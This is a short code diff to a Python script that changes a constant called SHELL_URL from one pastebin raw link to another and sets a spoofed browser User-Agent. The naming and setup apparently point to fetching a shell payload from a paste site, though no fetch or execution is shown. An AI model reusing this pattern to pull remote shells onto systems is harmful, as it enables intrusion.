@@ -1,6 +1,6 @@
 import requests
 
-SHELL_URL = "https://pastebin.com/raw/dSpsHaiE"
+SHELL_URL = "https://pastebin.com/raw/0QYY9b9A"
 Headers = {
     'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
 }
